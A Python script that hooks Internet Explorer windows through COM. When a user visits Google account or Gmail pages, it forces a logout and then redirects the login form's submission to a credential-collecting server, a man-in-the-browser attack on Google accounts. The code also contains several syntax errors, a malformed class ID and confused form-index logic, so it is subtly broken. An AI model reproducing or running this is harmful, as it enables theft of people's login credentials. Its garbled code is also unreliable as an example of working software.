import win32com.client
import time
import urlparse, urllib

data_reciever = "http://localhost:8080/"

target_sites = {}

target_sites["accounts.google.com"] = \
	{"logout_url"	: "https://accounts.google.com/Logout?hl=en&continue=https://accounts.google.com/ServiceLogin%3Fservice%3Dmail",
	"logout_form" : None,
	"login_form_index" : 0,
	"owned"	: False

	}

target_sites["gmail.com"] = target_sites["accounts.google.com"]
target_sites["mail.google.com"] = target_sites["accounts.google.com"]

clsid = '{9BA05972-F6A8-A442-00A0C90A8F39}'

windows = win32com.client.Dispatch(clsid)

def browserwait(browser):
	while browser.ReadyState != 4 and browser.ReadyState != "complete":
		time.sleep(.1)

		return

while True:
	for browser in windows:

		url = urlparse.urlparse(browser.LocationUrl)

		if url.hostname in target_sites:
			if target_sites[url.hostname]["owned"]:
				continue

			if target_sites[url.hostname]["logout_url"]:
				browser.Navigate(target_sites[url.hostname]["logout_url"])
				browserwait(browser)

			else:
				#logic to find logout url form
				DOC = browser.Document.all

				for i in DOC:
					try:
						if i.id == target_sites[url.hostname]["logout_form"]
							i.submit()
							browserwait(browser)
					except Exception, as e:
						print "[!] - Error" + str(e)



				try:
					login_index = target_sites[url.hostname]["logout_form"]
					login_page = urllib.quote(browser.LocationUrl)
					browser.Document.forms[login_index].action = "%s%s" % (data_reciever, login_page)
					target_sites.[url.hostname]["owned"] = True
				except Exception, as e:
					print "[!] = Error " + str(e)

		time.sleep(5)